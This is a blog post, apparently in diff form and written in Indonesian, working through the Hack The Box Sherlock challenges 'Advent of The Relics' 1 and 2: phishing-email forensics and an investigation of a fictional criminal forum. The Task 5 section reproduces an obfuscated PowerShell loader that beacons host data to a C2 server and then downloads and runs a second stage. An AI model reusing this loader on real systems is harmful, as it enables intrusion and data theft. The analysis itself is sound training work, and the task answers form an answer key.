@@ -1,0 +1,392 @@
+---
+title: "Write-Up Hack The Box Advent of The Relics"
+desc: "Write-up HTB Sherlock Advent of The Relics 1 (A Call from the Museum) dan 2 (Operation Winter Blackout): email phishing, forensik, dan penyelidikan forum kriminal."
+image: "/blog/hack-the-box-advent-of-the-relics/img-01.png"
+tags: ["ctf", "writeup", "forensic"]
+date: "2026-02-23"
+isPublished: true
+---
+
+# Write-Up Hack The Box Advent of The Relics
+
+## Advent of The Relics 1 - A Call from the Museum
+
+On a quiet mid-November evening, a fatigued CALE employee opened an unexpected email and, without much thought, followed the instructions it contained. Moments later, something felt off, panic set in, and he abruptly yanked the power cable from the wall to stop whatever had started. One month later, that same email resurfaces as the crucial starting point of a cyber investigation, holding the first clues to what really happened.
+
+The scenario portrayed in this challenge is entirely fictional and created solely for educational and entertainment purposes. Any resemblance to actual persons, living or dead, organizations, or real events is purely coincidental and unintentional. All characters, scenarios, and data presented are products of imagination.
+
+### Pendahuluan
+
+Disini saya mendownload file zip **AoTR-1\_A-Call-from-the-Museum.zip **dan saat diextract membutuhkan password yang dimana password bisa didapatkan di web htb, passwordnya hacktheblue. Dan saat diextract terdapat 2 file, file pertama berupa pdf
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-01.png)
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-02.png)
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-03.png)
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-04.png)
+
+dan file kedua berupa email, lalu saya membukanya menggunakan outlook
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-05.png)
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-06.png)
+
+Di email terdapat sebuah file zip lagi yang passwordnya adalah Up7Pk99G
+
+
+### Task 1
+
+Who is the suspicious sender of the email?
+
+Answer: [eu-health@ca1e-corp.org](mailto:eu-health@ca1e-corp.org)
+
+Explain: Di email terdapat sendernya dengan jelas yang berasal dari EU Health Logistics
+
+### Task 2
+
+What is the legitimate server that initially sent the email?
+
+Answer: [BG1P293CU004.outbound.protection.outlook.com](http://bg1p293cu004.outbound.protection.outlook.com/)
+
+Explain: Saya membuka file .eml dengan visual studio code dan disana terdapat server mana yang mengirim email tersebut
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-07.png)
+
+### Task 3
+
+What is the attachment filename?
+
+Answer: Health\_Clearance-December\_Archive.zip
+
+Explain: Nama file bisa dilihat di email jika kita membukanya di outlook
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-08.png)
+
+### Task 4
+
+What is the Document Code?
+
+Answer: EU-HMU-24X
+
+Explain: Untuk menemukan document code, saya membuka file pdf yang berada di dalam file zip Health\_Clearance-December\_Archive.zip, didalamnya terdapat file pdf dan sebuah [file.ink](http://file.ink) yang merupakan sebuah shortcut dan didalam file pdf terdapat document codenya
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-09.png)
+
+### Task 5
+
+What is the full URL of the C2 contacted through a POST request?
+
+Answer: [https://health-status-rs.com/api/v1/checkin](https://health-status-rs.com/api/v1/checkin)
+
+Explain: untuk menemukan full URL C2 dari post req, awalnya saya curiga dengan file .ink ini karena dalam dunia digital forensic file .ink sering dipakai untuk entry point oleh pembuat malware. Jadi mereka menyembunyikan perintah/command yang berbahaya, ini juga termasuk teknik icon spoofing, yaitu sengaja mengganti icon shortcut .ink dengan icon pdf yang tujuannya untuk mengelabui korban dan korban mengira itu hanya dokumen biasa lalu melakukan double click, yang menyebabkan script yang ada di file itu berjalan di latar belakang nah untuk mencari URL C2nya saya click kanan pada file .ink tersebut dan click properties dan selanjutnya pilih tab shortcut dan lihat pada column target
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-10.png)
+
+
+dan benar saja disana disana terdapat payload, payload fullnya
+
+
+`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe `
+
+`-nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh')); `
+
+`saps .\\Health_Clearance_Guidelines.pdf;`
+
+`$AX=$env:USERNAME;`
+
+`$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');`
+
+`$Bz=$env:USERDOMAIN;`
+
+`$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');`
+
+`$Mw=(gp HKLM:\\SOFTWARE\\Microsoft\\Cryptography).MachineGuid;`
+
+`$pP = @{u=$AX;d=$Bz;g=$Mw};`
+
+`$Zu=(iwr $oM -Method POST -Body $pP).Content;`
+
+`$Hd = @{Authorization = $Bs };`
+
+`iwr -Headers $Hd $Lj$Zu | iex;`
+
+nah URL C2nya adalah pada bagian deklarasi variabel `$oM` URL tersebut di encode, yang jika saya ubah `%3A` menjadi `:` , `%2F` menjadi `/` dan yang lain-lain, maka URL C2 tempat data dikirim via POST request adalah  [https://health-status-rs.com/api/v1/checkin](https://health-status-rs.com/api/v1/checkin)
+
+### Task 6
+
+The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?
+
+Answer: HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid
+
+Explain: Berdasarkan script/payload powershell, disana terdapat bagian data yang dibungkus untuk dikirimkan via POST request
+
+`$pP = @{u=$AX;d=$Bz;g=$Mw}`
+
+Yang dimana variabel `$pP `berisi 3 informasi
+
+1. u=\$AX yang diambil dari \$env:USERNAME
+2. d=\$Bz yang diambil dari \$env:USERDOMAIN
+3. g=\$Mw (ini adalah informasi terakhir)
+
+dan isi dari variabel \$Mw adalah `HKLM:\\SOFTWARE\\Microsoft\\Cryptography).MachineGuid` yang jika dirapihkan menjadi HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid
+
+### Task 7
+
+Then the script downloads and executes a second stage from another URL. What is the domain?
+
+Answer: advent-of-the-relics-forum.htb.blue
+
+Explain: Setelah berhasil check-in (POST request), server akan membalas dengan sebuah ID yang disimpan dalam variabel `$Zu` . Kemudian, script ini memanggil URL C2 kedua (di variabel `$Lj`) yang berisi `https://`[`advent-of-the-relics-forum.htb.blue`](http://advent-of-the-relics-forum.htb.blue)`/api/v1/implant/cid=` dan menggabungkannya dengan ID tadi untuk mengunduh tahap malware selanjutnya, lalu mengeksekusinya langsung di memori dengan perintah `iex` (*Invoke-Expression*). Jadi domainnya adalah advent-of-the-relics-forum.htb.blue yang jika dibuka akan terlihat seperti ini
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-11.png)
+
+### Task 8
+
+A set of credentials was used to access the previous resource. Retrieve them.
+
+Answer: svc\_temp:SnowBlackOut\_2026!
+
+Explain: Untuk menemukan credential tersebut, saya melihat bagaimana script melakukan permintaan kedua ke URL advent-of-the-relics-forum.htb.blue, pada akhir script terdapat
+
+`$Hd = @{Authorization = $Bs };`
+
+
+`iwr -Headers $Hd $Lj$Zu | iex;`  
+Permintaan web `(iwr)` tersebut menggunakan header Authorization yang nilainya diambil dari variabel `$Bs`. Dan isi dari variabel tersebut adalah
+
+
+`$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))`
+
+Script ini menggunakan fungsi -join untuk menggabungkan potonga-potongan string menjadi satu kesatuan demi menghindari deteksi. Jika saya gabungkan semua hasilnya menjadi `Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh` yang jika saya decode saya mendapatkan format username:password  dan hasilnya adalah svc\_temp:SnowBlackOut\_2026!. Jadi, set credential yang digunakan adalah
+
+- Username: svc\_temp
+- Password: SnowBlackOut\_2026!
+
+Yang jika saya masukkan passwordnya pada domain [https://advent-of-the-relics-forum.htb.blue/](https://advent-of-the-relics-forum.htb.blue/) saya bisa masuk ke dalamnya
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-12.png)
+
+## Advent of The Relics 2 - Operation Winter Blackout
+
+A phishing attack on a logistics company has led investigators to a [private criminal forum](https://advent-of-the-relics-forum.htb.blue/). The crew behind it has been planning something big for months. Your job is to dig through their communications and uncover who they are, what they're targeting, and how they plan to disappear.
+
+The forum can be accessed at: [**https://advent-of-the-relics-forum.htb.blue**](https://advent-of-the-relics-forum.htb.blue/)
+
+First, you will need to gain access to the forum using the password **SnowBlackOut\_2026!**, which you found in your [previous investigation](https://app.hackthebox.com/sherlocks/Advent%2520of%2520The%2520Relics%25201%2520-%2520A%2520Call%2520from%2520the%2520Museum?tab=play_sherlock), to unlock the intel inside.
+
+The scenario portrayed in this challenge is entirely fictional and created solely for educational and entertainment purposes. Any resemblance to actual persons, living or dead, organizations, or real events is purely coincidental and unintentional. All characters, scenarios, and data presented are products of imagination.
+
+### Pendahuluan
+
+Pada write up ini saya akan melanjutkan lab sebelumnya yaitu **Advent of The Relics 1 - A Call from the Museum**, saat ini saya bisa masuk ke dalam dari web  [**https://advent-of-the-relics-forum.htb.blue**](https://advent-of-the-relics-forum.htb.blue/)** **dengan memasukkan password SnowBlackOut\_2026!
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-13.png)
+
+### Task 1
+
+How many suspects are using this forum?
+
+Answer: 5
+
+Explain: Didalam tab members terdapat jumlah member, yaitu Curator, Bellringer, SnowFox, Driver\_BUD, Ledger
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-14.png)
+
+### Task 2
+
+What is the username of the group's leader?
+
+Answer: Curator
+
+Explain: Di deskripsi dari Curator ia menyebutkan bahwa dia adalah Ops lead, yang berarti dia adalah seorang group’s leader
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-15.png)
+
+### Task 3
+
+What is Driver\_BUD's real first name?
+
+Answer: Daniel
+
+Explain: Saya bisa mengetahui bahwa nama asli dari Driver\_BUD adalah daniel karena didalam categories **Off topic** di **threads RIP Diesel **SnowFox menyebutkan nama daniel setelah Driver\_BUD membuat thread tentang kehilangan anjingnya dan SnowFox membalas dengan menyebutkan nama daniel, yang secara otomatis nama asli Driver\_BUD itu adalah Daniel
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-16.png)
+
+### Task 4
+
+What is the codename of the operation?
+
+Answer: Winter Blackout
+
+Explain: Didalam categories **Operations** di threads **Project "Winter Blackout": Operational Scope & Goals**, disana disebutkan bahwa nama project/operationsnya bernama Winter Blackout
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-17.png)
+
+### Task 5
+
+What single word is the trigger code that activates all nodes?
+
+Answer: FROST
+
+Explain: Code yang mengaktifkan semua nodes adalah kata FROST, didalam categories **Operations** di threads **Sync Logic: "Midnight" Trigger Protocol Finalized **menyebutkan bahwa **Only one trigger word lights all nodes: 'FROST'**
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-18.png)
+
+### Task 6
+
+What is the name of the fake exhibition used as cover for the heist?
+
+Answer: Miracles of Winter
+
+Explain: Nama pameran palsunya adalah Miracles of Winter, didapat dari categories **Physical Logistics **di threads **Forged Manifests: "Miracles of Winter" Exhibition, **disana sudah tertera dari nama pameran palsunya
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-19.png)
+
+### Task 7
+
+What time was the single word trigger scheduled to execute on New Year's Eve?
+
+Answer: 23:59:50
+
+Explain: Pada pukul 23:59:50, ini didapat dari categories **Operations** di threads **Sync Logic: "Midnight" Trigger Protocol Finalized**, didalam threads itu Curator sang ketua operasi sudah merencanakan single word trigger pada pukul 23:59:50
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-20.png)
+
+### Task 8
+
+What is the full name of the phishing target at CALE?
+
+Answer: Kamil Poltavez
+
+Explain: Full namenya adalah Kamil Poltavez, ini didapat dari categories **Malware and stuff **di threads **Operation Winter Blackout: Patient Zero (Belgrade)**, disana terdapat primary target yaitu kamil poltavez dikarenakan pola lembur yang tinggi jadi memungkinkan mengclick phising
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-21.png)
+
+### Task 9
+
+What make and model is the truck used for transport?
+
+Answer: Volvo FH
+
+Explain: Model trucknya adalah Volvo FH, informasi ini didapat dari categories **Physical Logistics **di threads **Vehicle Prep: Volvo FH & Cold Weather Config**, disana tertera dengan jelas vehicle prepnya
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-22.png)
+
+### Task 10
+
+What is the name of Ledgers cat?
+
+Answer: Satoshi
+
+Explain: Disini legder tidak langsung menyebutkan kucingnya tetapi ia memasukkannya dalam sebuah threads yang menyebutkan bahwa “**Satoshi doesn't care. He just wants to sleep on the warm laptop. At least one of us is content**”, disini saya bisa simpulkan bahwa kucingnya itu bernama satoshi. Informasi ini didapat dari categories **Off topics **di dalam threads **Holiday stress relief (or lack thereof)**
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-23.png)
+
+### Task 11
+
+What is the primary C2 domain used for beacon check-ins?
+
+Answer: [health-status-rs.com](http://health-status-rs.com/)
+
+Explain: Jawaban saya dapatkan di categories **Infrastructure **di dalam threads **C2 Infrastructure: Domain Registration & SSL**, disana terdapat primary, panel dan fallback domain dan primary domainnya adalah health-status-rs.com
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-24.png)
+
+### Task 12
+
+In which city is the VPS server hosting the C2 panel?
+
+Answer: Kragujevac
+
+Explain: Server VPS berada di kota Kragujevac, informasi ini didapat dari categories dan threads yang sama dengan Task 11, yaitu categories **Infrastructure **di dalam threads **C2 Infrastructure: Domain Registration & SSL**
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-25.png)
+
+### Task 13
+
+On what date did the C2 listeners go live?
+
+Answer: 2025-11-12
+
+Explain: Listiners go live pada tanggal 12 Nov 2025, informasi ini bisa didapatkan dari categories **Malware and stuff **didalam threads **C2 Infrastructure Status: GREEN**
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-26.png)
+
+### Task 14
+
+In which city is the document forger located?
+
+Answer: Bucharest
+
+Explain: Lokasi dokumen palsu ada di Bucharest, informasi masih ini didapatkan di categories **Physcial Logistics **didalam threads **Forged Manifests: "Miracles of Winter" Exhibition**, disana dijelaskan bahwa pemalsu sangat hebat, karena dokumen asli dengan palsu tidak dapat dibedakan padahal Curator telah melihat ratusan dokumen asli
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-27.png)
+
+### Task 15
+
+What shell company was used as a backup cover story?
+
+Answer: Danube Event Solutions Ltd
+
+Explain: Nama perusahaan fiktif yang digunakan dalam cerita palsu adalah Danube Event Solutions Ltd, informasi ini didapatkan dari categories **Operations **didalam threads **Contingency Protocols: If "Carnet" access is revoked**
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-28.png)
+
+### Task 16
+
+What is the filename of the wipe script used to destroy evidence?
+
+Answer: burn\_cycle.sh
+
+Explain: Filenamenya bernama burn\_cycle.sh, informasi ini didapat dari categories **Infrastructure **didalam threads **Server Wipe Protocols, **disana dijelaskan tentang scriptnya yang dimana script itu di install di directory root pada semua node dengan salah satu fungsinya adalah memicu kernel panik dan pematian paksa
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-29.png)
+
+### Task 17
+
+What is the name of the escape vessel?
+
+Answer: Adriatic Wind
+
+Explain: Nama kapal penyelamatnya adalah Adriatic Wind, informasi ini didapat di categories Operations di dalam treads **Exfiltration Protocol: Staging South Exit Route, **disana dijelaskan bahwa kapal adriatic wind akan tiba pukul 04.00
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-30.png)
+
+### Task 18
+
+What is the captain's name?
+
+Answer: Stavros
+
+Explain: di categories dan threads yang sama terdapat nama kapten setelah memberitahu bahwa kapal akan tiba pada pukul 04.00 dan tanyakan tentang stavros, disini saya langsung menyimpulkan bahwa stavros adalah captainnya
+
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-31.png)
+
+### Task 19
+
+What are the GPS coordinates of the emergency extraction point for Driver\_BUD?
+
+Answer: 37.936489, 23.68644
+
+Explain: Sebenarnya koordinat gps tidak diberitahu secara langsung, berdasarkan informasi yang ada di categories yang sama dan treads yang sama dengan Task 17 dan Task 18, Curator menyuruh menghafal 3 kata, yaitu **twitchy develop hulk. **Curator juga bilang, "These three words correspond to the exact GPS coordinates", yang artinya ini adalah petunjuk yang dimana saya harus pergi ke web what3words dan memasukkan 3 kata tersebut
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-32.png)
+
+dan saya melihat koordinatnya di bagian share dan menampilkan latitude dan longtitudenya
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-33.png)
+
+dan GPS coordinatenya adalah 37.936489, 23.68644
+
+### Task 20
+
+What are the GPS coordinates of the farmhouse hideout?
+
+Answer: 43.84947615369828, 20.92715775614975
+
+Explain: Tidak seperti Task 19 yang dimana koordinat tidak diberitahu secara langsung, untuk task ini saya mendapatkan informasi di categories **Physical Logistics **di dalam threads **Staging Point "South": Site access and concealment**
+
+![screenshot](/blog/hack-the-box-advent-of-the-relics/img-34.png)
